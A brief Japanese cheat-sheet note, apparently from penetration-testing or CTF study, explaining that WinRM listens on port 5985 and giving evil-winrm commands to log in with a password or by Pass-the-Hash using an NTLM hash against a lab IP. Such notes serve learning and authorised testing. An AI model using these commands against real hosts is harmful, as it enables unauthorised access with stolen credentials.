## ## 基本情報
LinuxでいうところのSSHみたいなもん。
デフォるとポートは5985で動作する。

## ## 接続方法
- 資格情報があるときの接続方法
```sh
evil-winrm -i <target_IP or Hostname> -u <username> -p <Password>
```

- hashで接続しに行くやり方(Pass The Hash)
```sh
evil-winrm -u administrator -H '0e0363213e37b94221497260b0bcb4fc' -i 10.10.22.204
```